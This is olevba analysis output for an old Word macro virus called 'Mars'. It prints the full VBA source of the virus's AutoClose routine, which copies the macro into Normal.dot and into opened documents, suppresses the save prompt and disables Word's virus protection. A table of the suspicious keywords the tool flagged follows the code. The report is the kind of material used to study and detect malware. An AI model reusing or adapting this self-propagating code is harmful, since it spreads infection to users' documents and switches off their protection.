olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.DWMVCK1.h-b1833b4a70f818aa90079befb1db8b98d22c7e66
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.DWMVCK1.h-b1833b4a70f818aa90079befb1db8b98d22c7e66 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mars.bas 
in file: Virus.MSWord.DWMVCK1.h-b1833b4a70f818aa90079befb1db8b98d22c7e66 - OLE stream: 'Macros/VBA/Mars'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro created 11/16/97 by Mars\r\n\r\n\r\n\r\nBengkalis\r\n"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.Mars.AutoClose"
    On Error GoTo DoCancel
    Application.ScreenUpdating = False
    
    Set ActiveDoc = ActiveDocument
    If (ActiveDocument.VBProject.VBComponents.Count = 1) And (Left$(ActiveDocument.Name, 8) <> "Document") Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Mars", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If
    
    Set GlobalDoc = NormalTemplate
    If (NormalTemplate.VBProject.VBComponents.Count = 1) Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Mars", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If
    
    DayMonth = Day(Date) * 100 + Month(Date)
    If (DayMonth = 1611) Or (Day(Date) = 1) Then
        With Assistant.NewBalloon
            .Animation = msoAnimationGreeting
            .Text = "Have a nice day"
            .Icon = msoIconTip
            .Show
        End With
    End If
    Application.ScreenUpdating = True
    
DoCancel:
    Options.VirusProtection = False

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

